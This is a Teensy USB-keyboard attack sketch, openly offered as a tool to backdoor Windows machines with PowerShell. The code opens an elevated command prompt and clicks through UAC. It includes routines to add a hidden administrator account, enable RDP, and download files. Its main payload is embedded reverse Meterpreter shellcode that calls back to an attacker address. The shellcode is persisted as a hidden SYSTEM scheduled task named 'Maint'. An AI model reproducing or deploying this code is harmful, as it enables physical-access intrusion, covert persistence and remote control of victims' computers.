/*
This Teensy payload was developed to reliably backdoor Windows systems with powershell installed.
Current payload is a scheduled reverse meterpreter powershell script, planted in %WINDIR%.
A basic template for non powershell enabled machines is present, and can easily be extended.
*/

#include <usb_private.h>

// Teensy has LED on 11
const int led_pin = 11; 

// Wait for Windows to be ready before we start typing.

void wait_for_drivers(unsigned int speed)
{
	bool numLockTrap = is_num_on();
	while(numLockTrap == is_num_on())
	{
		blink_fast(5,80);
		press_numlock();
		unpress_key();
		delay(speed);
	}
	press_numlock();
	unpress_key();
	delay(speed);
}


// NUM, SCROLL, CAPS Led keys checking. We only use NUMLOCK in this sketch. 
int ledkeys(void)       {return int(keyboard_leds);}
bool is_scroll_on(void) {return ((ledkeys() & 4) == 4) ? true : false;}
bool is_caps_on(void)   {return ((ledkeys() & 2) == 2) ? true : false;}
bool is_num_on(void)    {return ((ledkeys() & 1) == 1) ? true : false;}

void unpress_key(void)
{
	Keyboard.set_modifier(0);
	Keyboard.set_key1(0);
	Keyboard.send_now();
	delay(500);
}

void blink_fast(int blinkrate,int delaytime)
{
	int blinkcounter=0;
	for(blinkcounter=0; blinkcounter!=blinkrate; blinkcounter++)
	{
		digitalWrite(led_pin, HIGH);
		delay(delaytime);
		digitalWrite(led_pin, LOW);
		delay(delaytime);
	}
}

void alt_y(void)
{
	Keyboard.set_modifier(MODIFIERKEY_ALT);
	Keyboard.set_key1(KEY_Y);
	Keyboard.send_now();
	delay(100);
	unpress_key();
}

// Attempts to open a UAC enabled prompt (reps) times, with (millisecs) milliseconds between each attempt. 
// Minimal reasonable values are : secure_prompt(3,700);

bool secure_prompt(int reps, int millisecs)
{
	make_sure_numlock_is_off();
	delay(700);
	Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
	Keyboard.send_now();
	Keyboard.set_modifier(0);
	Keyboard.send_now();
	delay(8000);
	Keyboard.print("cmd.exe");
	delay(8000);
	Keyboard.set_modifier(MODIFIERKEY_CTRL);
	Keyboard.send_now();
	Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
	Keyboard.send_now();
	Keyboard.set_key1(KEY_ENTER);
	Keyboard.send_now();
	delay(200);
	unpress_key();
	delay(8000);
	alt_y();
	delay(4000);
	Keyboard.println(F(""));
	delay(400);
	create_click_numlock_win();
	check_for_numlock_sucess_teensy(reps,millisecs);
}

// A Teensy side check for a pressed numlock key. Will check for a pressed numlock key (reps) times, with (millisecs) milliseconds in between checks.
// The "reps" and millisecs" variables are fed to this function from other functions that require timing. For example:
// check_for_powershell(3,500);  
// download_powershell("http://172.16.1.2/remotefile.exe","localfile.exe",20,1000);

bool check_for_numlock_sucess_teensy(int reps, int millisecs)
{
	unsigned int i = 0;
	do
	{
		delay(millisecs);
		if (is_num_on())
		{
			make_sure_numlock_is_off();
			delay(700);
			return true;
		}
		i++;
	}
	while (!is_num_on() && (i<reps));
	return false;
}

// An example for a fallback Teensy CMD sequence you can employ using a dip switch or on failure of the secure_prompt function. 
// Minmal reasonable values are : secure_prompt(3,700); 
// Not used in this sketch. 

void secure_prompt_fallback(int reps, int millisecs) 
{
	blink_fast(3,80);
	make_sure_numlock_is_off();
	delay(700);
	Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
	Keyboard.set_key1(KEY_R);
	Keyboard.send_now();
	Keyboard.set_modifier(0);
	Keyboard.set_key1(0);
	Keyboard.send_now();
	delay(8000);
	Keyboard.print("cmd.exe");
	delay(200);
	Keyboard.set_key1(KEY_ENTER);
	Keyboard.send_now();
	Keyboard.set_key1(0);
	Keyboard.send_now();
	delay(8000);
	Keyboard.println(F(""));
	delay(400);
	create_click_numlock_win();
	check_for_numlock_sucess_teensy(reps,millisecs);
}

// Dumps and executes a vbscript to the Windows File System that programatically presses the NUMLOCK key.

void create_click_numlock_win()
{
	blink_fast(3,80);
	Keyboard.println(F("echo Set WshShell = WScript.CreateObject(\"WScript.Shell\"): WshShell.SendKeys \"{NUMLOCK}\"' > numlock.vbs"));
	delay(400);
	Keyboard.println(F("cscript numlock.vbs"));
	delay(2000);
}

// Adds a hidden local administrative user to the Windows machine.

void add_user(char *username,char *password)
{
	blink_fast(3,80);
	Keyboard.print(F("net user "));
	Keyboard.print(username);
	Keyboard.print(F(" "));
	Keyboard.print(password);
	Keyboard.println(F(" /add"));
	delay(300);

	Keyboard.print(F("net localgroup administrators "));
	Keyboard.print(username);
	Keyboard.println(F(" /add"));
	delay(300);

	Keyboard.print(F("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v "));
	Keyboard.print(username);
	Keyboard.println(F(" /d 0 /t REG_DWORD /f"));
	delay(300);
}

// Enable RDP and open firewall 

void enable_rdp(void)
{
	blink_fast(3,80);
	Keyboard.println(F("reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"));
	delay(500);
	Keyboard.println(F("reg add \"HKLM\\System\\CurrentControlSet\\Services\\TermService\" /v Start /t REG_DWORD /d 2 /f"));
	delay(500);
	Keyboard.println(F("sc start termservice"));
	delay(3000);
	Keyboard.println(F("netsh firewall set service type = remotedesktop mode = enable"));
	delay(1000);
}

// Download a file using powershell. for example:
// download_powershell("http://IPADDR/hstart.exe","hstart.exe",10,1000);
// This will attempt to download the file hstart.exe, while monitoring the success 
// of the download for 10 seconds, every 1000 milliseconds. Will press on numlock on success.

bool download_powershell(char *url,char *localfile,int reps, int millisecs)
{
	blink_fast(3,80);
	make_sure_numlock_is_off();
	delay(300);
	Keyboard.println(F("powershell"));
	delay(5000);
	Keyboard.print("$webclient = New-Object System.Net.WebClient;$url = \"");
	Keyboard.print(url);
	Keyboard.print("\";$file = \"");
	Keyboard.print(localfile);
	Keyboard.println("\";$webclient.DownloadFile($url,$file);if($?){$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{NUMLOCK}')}");
	Keyboard.println(F("exit"));
	delay(200);
	return check_for_numlock_sucess_teensy(reps,millisecs);
}

// Types out a powershell reverse meterpreter to the screen. Can be used as a stand-alone single payload run from memory
// or can be echo'ed into a file (see  meterpreter_backdoor_deploy()); arch=1 for 64 bit OS, and arch=0 for 32 bit. For example: 
// inline_reverse_meterpreter(0,12,12,12,12,443); 
// Given an *open powershell prompt*, this above function will send a Win32 (arch=0) reverse meterpreter shell to 172.16.1.200:443

void inline_reverse_meterpreter(bool arch,int ip1,int ip2,int ip3, int ip4, unsigned short port )   
{
	blink_fast(3,80);
	char iphex[32];
	sprintf(iphex, "$rhost=0x%.2x,0x%.2x,0x%.2x,0x%.2x;", ip1,ip2,ip3,ip4);
	char porthex[20];
	sprintf(porthex, "$rport=0x%.2x,0x%.2x;",(port >> 8 & 0xff), (port & 0xff));
	Keyboard.print(F("$code = '"));
	Keyboard.print(F("[DllImport(\"kernel32.dll\")]"));
	Keyboard.print(F("public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);"));
	Keyboard.print(F("[DllImport(\"kernel32.dll\")]"));
	Keyboard.print(F("public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);"));
	Keyboard.print(F("[DllImport(\"msvcrt.dll\")]"));
	Keyboard.print(F("public static extern IntPtr memset(IntPtr dest, uint src, uint count);';"));
	Keyboard.print(F("$winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru;"));

	if (arch) // arch = 1 - 64 bit meterpreter
	{
		Keyboard.print(F("$p00=0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52;"));
		Keyboard.print(F("$p01=0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48;"));
		Keyboard.print(F("$p02=0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9;"));
		Keyboard.print(F("$p03=0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41;"));
		Keyboard.print(F("$p04=0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48;"));
		Keyboard.print(F("$p05=0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01;"));
		Keyboard.print(F("$p06=0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48;"));
		Keyboard.print(F("$p07=0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0;"));
		Keyboard.print(F("$p08=0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c;"));
		Keyboard.print(F("$p09=0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0;"));
		Keyboard.print(F("$p10=0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04;"));
		Keyboard.print(F("$p11=0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59;"));
		Keyboard.print(F("$p12=0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48;"));
		Keyboard.print(F("$p13=0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33;"));
		Keyboard.print(F("$p14=0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00;"));
		Keyboard.print(F("$p15=0x49,0x89,0xe5,0x49,0xbc,0x02,0x00;"));
		Keyboard.print(iphex);
		Keyboard.print(porthex);
		Keyboard.print(F("$p16=0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c;"));
		Keyboard.print(F("$p17=0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff;"));
		Keyboard.print(F("$p18=0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2;"));
		Keyboard.print(F("$p19=0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48;"));
		Keyboard.print(F("$p20=0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99;"));
		Keyboard.print(F("$p21=0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x48,0x83,0xec;"));
		Keyboard.print(F("$p22=0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41;"));
		Keyboard.print(F("$p23=0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x48,0x83,0xc4,0x20,0x5e,0x6a,0x40,0x41;"));
		Keyboard.print(F("$p24=0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41;"));
		Keyboard.print(F("$p25=0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31;"));
		Keyboard.print(F("$p26=0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8;"));
		Keyboard.print(F("$p27=0x5f,0xff,0xd5,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xe1,0x41,0xff,0xe7;"));
		Keyboard.print(F("[Byte[]];"));
		Keyboard.print(F("[Byte[]]$sc64 = $p00+$p01+$p02+$p03+$p04+$p05+$p06+$p07+$p08+$p09+$p10+$p11+$p12+$p13+$p14+$p15+$rport+$rhost+$p16+$p17+$p18+$p19+$p20+$p21+$p22+$p23+$p24+$p25+$p26+$p27;"));

	}
	else	// arch = 0 - 32 bit meterpreter
	{
		Keyboard.print(F("$p01=0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b;"));
		Keyboard.print(F("$p02=0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0;"));
		Keyboard.print(F("$p03=0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57;"));
		Keyboard.print(F("$p04=0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01;"));
		Keyboard.print(F("$p05=0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b;"));
		Keyboard.print(F("$p06=0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4;"));
		Keyboard.print(F("$p07=0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b;"));
		Keyboard.print(F("$p08=0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24;"));
		Keyboard.print(F("$p09=0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d;"));
		Keyboard.print(F("$p10=0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07;"));
		Keyboard.print(F("$p11=0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00;"));
		Keyboard.print(F("$p12=0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff;"));
		Keyboard.print(F("$p13=0xd5,0x97,0x6a,0x05,0x68;"));
		Keyboard.print(F("$p14=0x68,0x02,0x00;"));
		Keyboard.print(iphex);
		Keyboard.print(porthex);
		Keyboard.print(F("$p15=0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff;"));
		Keyboard.print(F("$p16=0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56;"));
		Keyboard.print(F("$p17=0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00;"));
		Keyboard.print(F("$p18=0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56;"));
		Keyboard.print(F("$p19=0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;"));
		Keyboard.print(F("[Byte[]];"));
		Keyboard.print(F("[Byte[]]$sc64 = $p01+$p02+$p03+$p04+$p05+$p06+$p07+$p08+$p09+$p10+$p11+$p12+$p13+$rhost+$p14+$rport+$p15+$p16+$p17+$p18+$p19;"));
	}

	Keyboard.print(F("[Byte[]]$sc = $sc64;$size = 0x1000;"));
	Keyboard.print(F("if ($sc.Length -gt 0x1000) {$size = $sc.Length};"));
	Keyboard.print(F("$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);"));
	Keyboard.print(F("for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};"));
	Keyboard.print(F("$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };"));
}

// Echos the inline_reverse_meterpreter into a file ( %WINDIR%\system.ps1), and runs it as a 10 minute scheduled task called Maint.
// The task runs as SYSTEM, thus hiding the process from the active user.

void meterpreter_backdoor_deploy(bool arch,int a,int b,int c,int d,unsigned short port)
{
	blink_fast(3,80);
	Keyboard.print(F("echo "));
	delay(700);
	inline_reverse_meterpreter(arch,12,12,12,12,port); //ipaddr:443
	delay(1000);
	Keyboard.print(F(" > %WINDIR%\\system.ps1"));
	delay(700);
	Keyboard.println(F(""));
	Keyboard.println(F("schtasks /create /ru SYSTEM /sc MINUTE /MO 10 /tn Maint /tr \"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File %WINDIR%\\system.ps1\""));
	delay(300);
	Keyboard.println(F("schtasks /run /tn Maint"));
}

// Minimises all windows 3 times with (sleep) milliseconds in between. used on failure of CMD opening.

void minimise_windows(void)
{
	Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
	Keyboard.set_key1(KEY_M);
	Keyboard.send_now();
	delay(300);
	unpress_key();
	delay(300);
}

void reset_windows_desktop(int sleep)
{
	delay(1000);
	minimise_windows();
	delay(sleep);
	minimise_windows();
	delay(sleep);
	minimise_windows();
	delay(200);
}


void press_numlock(void)
{
	Keyboard.set_key1(KEY_NUM_LOCK);
	Keyboard.send_now();
	delay(200);
}

void make_sure_numlock_is_off(void)
{
	if (is_num_on())
	{
		delay(500);
		press_numlock();
		delay(700);
		unpress_key();
		delay(700);
	}
}


// Checks for internet availability by dumping and executing a vbscript to the local file system.
// Presses numlock on success.
// Minimal reasonable values are : check_for_internet("http://www.google.com",2,700);

bool check_for_internet(char *url,int reps, int millisecs)
{
	make_sure_numlock_is_off();
	Keyboard.print(F("echo If PingSite() Then: Set WshShell = WScript.CreateObject(\"WScript.Shell\"):WshShell.SendKeys \"{NUMLOCK}\":End If:Function PingSite():Dim intStatus, objHTTP: Set objHTTP = CreateObject( \"WinHttp.WinHttpRequest.5.1\" ):objHTTP.Open \"GET\", \""));
	Keyboard.print(url);
	Keyboard.println(F("\", False:objHTTP.SetRequestHeader \"User-Agent\", \"Mozilla/4.0 (compatible; MyApp 1.0; Windows NT 5.1)\":On Error Resume Next: objHTTP.Send:intStatus = objHTTP.Status:On Error Goto 0:If intStatus = 200 Then:PingSite = True:Else:PingSite = False:End If:Set objHTTP = Nothing:End Function > check.vbs"));
	delay(700);
	Keyboard.println(F("cscript check.vbs"));
	return check_for_numlock_sucess_teensy(reps,millisecs);
}

// Check for powrershell availability.
// Presses numlock on sucess.
// Minimal reasonable values are : check_for_powershell(2,700);

bool check_for_powershell(int reps, int millisecs)
{
	bool success;
	make_sure_numlock_is_off();
	Keyboard.println("powershell");
	delay(1000);
	Keyboard.println("$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{NUMLOCK}')");
	delay(200);
	success=check_for_numlock_sucess_teensy(reps,millisecs);

	if (success)
	{
		Keyboard.println("exit");
	}
	return success;
}

// Check for Windows architecture using vbscript. Dumps a file to the Windows host and executes it.
// Presses numlock on success.
// Minimal reasonable values are : check_windows_arch_vbscript(2,700);

bool check_windows_arch_vbscript(int reps, int millisecs)
{
	Keyboard.println(F("echo If Is64Bit Then: Set WshShell = WScript.CreateObject(\"WScript.Shell\"): WshShell.SendKeys \"{NUMLOCK}\"':End If > arch.vbs"));
	Keyboard.println(F("echo Function Is64Bit(): Is64Bit = False: Dim colOS : Set colOS = GetObject(\"WinMGMTS://\").ExecQuery(\"SELECT AddressWidth FROM Win32_Processor\",,48): Dim objOS: For Each objOS In colOS: If objOS.AddressWidth = 64 Then Is64Bit = True >> arch.vbs"));
	Keyboard.println(F("echo Next: End Function >> arch.vbs"));
	delay(700);
	Keyboard.println(F("cscript arch.vbs"));
	return check_for_numlock_sucess_teensy(reps,millisecs);
}

// Check for Windows architecture using powershell. Executes the command in the terminal.
// Presses numlock on success.
// Minimal reasonable values are : check_windows_arch_powershell(2,700);

bool check_windows_arch_powershell(int reps, int millisecs)
{
	make_sure_numlock_is_off();
	Keyboard.println("powershell");
	delay(1000);
	Keyboard.println("if ([System.IntPtr]::Size -eq 8){ $wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('{NUMLOCK}')}");
	Keyboard.println("exit");
	unsigned int i = 0;
	return check_for_numlock_sucess_teensy(reps,millisecs);
}

// Preforms a Windows copy operation from the attached FAT formatted SD drive to the target machine. The drive VOLUME NAME is also taken as a parameter. For example:
// wincopy_from_sd_card("hstart64.exe" ,"hstart.exe","PAYLOAD");


void setup(void)
{
	Serial.begin(9600);
	bool arch = 0; // 0 = 32 bit, 1 = 64 bit.
	blink_fast(10,80);
	delay(3000);
	wait_for_drivers(2000);
	delay(8000);
	minimise_windows();
	delay(200);

	while (!secure_prompt(3,500))
	{
		reset_windows_desktop(2000);
	}

	delay(2000);
	// enable_rdp();
	// add_user("supsup", "#9123supsup!");
	// download_powershell("http://172.16.1.2/hstart.exe","hstart.exe",10,1000)
	// wincopy_from_sd_card("hstart64.exe" ,"hstart.exe","PAYLOAD");

	if (check_for_powershell(3,500))
	{
		arch=check_windows_arch_powershell(3,500);
		delay(4000);
		if (arch)
		{
  			meterpreter_backdoor_deploy(arch,12,12,12,12,443); // you need to set listeners for both 32 and 64 bit meterpreter payloads. Different IP's or ports
  		}
		else
		{
  			meterpreter_backdoor_deploy(arch,12,12,12,12,443);
		}

	}
	else
	{
		// stuff to do if no powershell is present.
		arch = check_windows_arch_vbscript(3,500);
	}
}


void loop(void){}
